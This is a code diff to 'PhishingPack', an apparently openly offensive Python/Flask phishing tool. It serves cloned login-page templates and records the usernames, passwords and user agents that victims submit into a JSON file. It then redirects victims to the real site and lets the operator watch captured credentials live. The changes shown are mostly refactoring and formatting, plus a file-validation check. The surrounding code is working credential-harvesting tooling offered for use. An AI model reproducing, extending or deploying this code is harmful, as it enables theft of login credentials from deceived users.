@@ -4,20 +4,20 @@ from pyfiglet import figlet_format
 from flask import Flask, render_template, request
 from time import sleep
 from json import dump, load
-import sys
 import os
 from multiprocessing import Process
 import atexit
 from shutil import copy2
 from threading import Thread
 from socket import gethostbyname, gethostname
+from contextlib import redirect_stdout, redirect_stderr
 
 console = Console(force_terminal=True)
 app = Flask(__name__)
 
 hostname = gethostname()
 ip_address = gethostbyname(hostname)
-PORT = 55555
+PORT = 5150
 
 help_string = """
 [bright_blue]Help usage for PhishingPack![/bright_blue]
@@ -74,7 +74,7 @@ def submit():
             "user_agent": user_agent,
             "time": time,
             "username": username,
-            "password": password
+            "password": password,
         }
         all_data.append(data_to_save)
         set_new_data(True)
@@ -82,21 +82,22 @@ def submit():
 
         with open("data.json", "w") as f:
             dump(all_data, f)
-        
+
         current_site = get_current_site()
         site = get_site_from_name(current_site)
         return site["redirect_to"]
 
 
-
-
 def all_sites_string():
     i = 1
 
-    console.print("\n\nChoose one of the following site template to start the server:\n", style="bright_yellow")
+    console.print(
+        "\n\nChoose one of the following site template to start the server:\n",
+        style="bright_yellow",
+    )
     all_sites = get_all_sites()
     for site in all_sites:
-        console.print(f"{i}. {site["name"]}", style="sea_green1")
+        console.print(f"{i}. {site['name']}", style="sea_green1")
         i += 1
 
 
@@ -104,51 +105,62 @@ def get_all_data():
     with open("data.json", "r") as f:
         return load(f)
 
+
 def get_all_sites():
     with open("config/sites.json", "r") as f:
         return load(f)
+
 
 def get_site_from_name(name):
     all_sites = get_all_sites()
     for site in all_sites:
         if site["name"] == name:
             return site
-        
+
 
 def load_logs():
     with open("logs", "r") as f:
         return load(f)
 
+
 def save_logs(data):
     with open("logs", "w") as f:
         dump(data, f)
 
+
 def get_current_site():
     return load_logs()["current_site"]
+
 
 def set_current_site(site):
     data = load_logs()
     data["current_site"] = site
     save_logs(data)
 
+
 def get_monitor():
     return load_logs()["monitor"]
+
 
 def set_monitor(arg):
     data = load_logs()
     data["monitor"] = arg
     save_logs(data)
 
+
 def get_new_data():
     return load_logs()["new_data"]
+
 
 def set_new_data(arg):
     data = load_logs()
     data["new_data"] = arg
     save_logs(data)
 
+
 def get_latest_data():
     return load_logs()["latest_data"]
+
 
 def set_latest_data(arg):
     data = load_logs()
@@ -157,9 +169,9 @@ def set_latest_data(arg):
 
 
 def start_flask_server():
-    sys.stdout = open(os.devnull, "w")
-    sys.stderr = open(os.devnull, "w")
-    app.run(host="0.0.0.0", port=PORT, debug=False)
+    with open(os.devnull, "w") as null:
+        with redirect_stdout(null), redirect_stderr(null):
+            app.run(host="0.0.0.0", port=PORT, debug=False)
 
 
 def stop_flask_server():
@@ -171,6 +183,9 @@ def setSiteTemplate(site_name):
     site = get_site_from_name(site_name)
     source = f"templates/{site['template']}"
     dest = "templates/index.html"
+
+    with open("templates/index.html", "w") as _f:
+        pass
     copy2(source, dest)
 
 
@@ -192,7 +207,6 @@ def monitor_data():
     set_latest_data({})
     set_new_data(False)
 
-
     while True:
         if not get_monitor():
             break
@@ -208,6 +222,7 @@ def monitor_data():
             set_new_data(False)
             set_latest_data({})
 
+
 def display_data():
     all_data = get_all_data()
     if len(all_data) == 0:
@@ -222,10 +237,29 @@ def display_data():
             print(f"password={data['password']}")
             print("\n")
 
+
+def check_for_files():
+    try:
+        with open("data.json", "r") as f:
+            load(f)
+    except:
+        console.print("\nInvalid data.json file.", style="red")
+        console.print("Please check the file and try again.", style="yellow bold")
+        exit()
+
+    try:
+        with open("config/sites.json", "r") as f:
+            load(f)
+    except:
+        console.print("\nInvalid sites.json file.", style="red")
+        console.print("Please check the file and try again.", style="yellow bold")
+        exit()
+
+
 def main():
     global server_process
     atexit.register(stop_flask_server)
-    
+
     while True:
         console.print("PhishingPack >", style="bold spring_green2 underline", end="")
         command = input(" ")
@@ -276,16 +310,22 @@ def main():
                 console.print("\nThe server is not running.\n", style="red")
         elif command == "server status":
             if server_process.is_alive():
-                console.print(f"\nThe server is running for {get_current_site()} phishing site.\n", style="spring_green2 bold",)
+                console.print(
+                    f"\nThe server is running for {get_current_site()} phishing site.\n",
+                    style="spring_green2 bold",
+                )
             else:
                 console.print("\nThe server is not running.\n", style="yellow2 bold")
         elif command == "server monitor":
             if server_process.is_alive():
                 clear_console()
                 console.print(
-                    f"\nMonitoring {get_current_site()} phishing site...", style="dodger_blue2"
+                    f"\nMonitoring {get_current_site()} phishing site...",
+                    style="dodger_blue2",
                 )
-                console.print("\nLooking for data from the site...", style="dodger_blue2")
+                console.print(
+                    "\nLooking for data from the site...", style="dodger_blue2"
+                )
                 console.print("Type 'q' to quit.\n", style="green")
                 set_monitor(True)
                 Thread(target=monitor_data, daemon=True).start()
@@ -296,7 +336,9 @@ def main():
                         set_monitor(False)
                         set_new_data(False)
                         set_latest_data({})
-                        console.print("\nStopped monitoring the server.\n", style="green")
+                        console.print(
+                            "\nStopped monitoring the server.\n", style="green"
+                        )
                         break
             else:
                 console.print("\nThe server is not running.\n", style="red")
@@ -351,11 +393,13 @@ if __name__ == "__main__":
             },
             f,
         )
-    
+
     # Creating data file if not exist
     if not path.exists("data.json"):
         with open("data.json", "w") as f:
             dump([], f)
+
+    check_for_files()
 
     server_process = Process(target=start_flask_server)
     start()
